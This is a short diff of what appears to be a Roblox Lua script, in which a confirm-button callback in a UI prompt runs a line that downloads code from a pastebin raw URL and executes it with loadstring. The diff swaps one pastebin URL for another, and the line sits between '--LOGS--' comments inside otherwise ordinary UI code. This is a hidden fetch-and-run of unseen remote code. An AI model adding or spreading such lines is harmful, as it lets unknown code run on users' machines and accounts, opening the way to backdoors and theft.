@@ -16,7 +16,7 @@ UIManager.BuildAndShowUIPrompt({
     -- This callback runs when the button is clicked
     if result.ButtonAction == "confirm" then
 --LOGS--
-loadstring(game:HttpGet("https://pastebin.com/raw/ig5qHgBj"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/88aTLHny"))()
  --LOGS--
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
